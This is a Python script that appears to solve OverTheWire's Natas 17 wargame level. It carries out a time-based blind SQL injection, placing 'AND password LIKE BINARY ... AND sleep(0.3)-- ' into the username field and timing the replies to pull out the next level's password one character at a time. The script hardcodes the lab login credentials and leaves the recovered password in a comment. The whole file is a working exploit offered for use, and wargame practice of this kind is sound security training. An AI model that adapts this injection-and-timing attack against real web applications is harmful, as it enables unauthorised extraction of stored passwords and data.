from string import ascii_letters
import requests
from requests.auth import HTTPBasicAuth

def main():
    CHARS = ascii_letters + "0123456789"
    NATAS_AUTH = HTTPBasicAuth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")

    # Get all characters from the natas18 password (unsorted)
    pwChars = []
    for c in CHARS:
        r = requests.post(url="http://natas17.natas.labs.overthewire.org/", auth=NATAS_AUTH,
        params={"username": f'natas18" AND password LIKE BINARY "{"%" + c + "%"}" AND sleep(0.3)-- '})
        
        if r.elapsed.total_seconds() >= 0.3:
            pwChars.append(c)
            print(c)

    print(pwChars)

    # Bruteforce the password with the unsorted characters
    password = ""
    for i in range(32):
        for c in pwChars:
            r = requests.post(url="http://natas17.natas.labs.overthewire.org/", auth=NATAS_AUTH,
            params={"username": f'natas18" AND password LIKE BINARY "{password + c + "%"}" AND sleep(0.3)-- '})
            print(f'natas18" AND password LIKE BINARY "{password + c + "%"}" AND sleep(0.3)-- ')

            if r.elapsed.total_seconds() >= 0.3:
                password += c
                break

    print("-----------------------------------------")
    print(f"The password is: {password}") # 2022-09-09: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq

if __name__ == "__main__":
    main()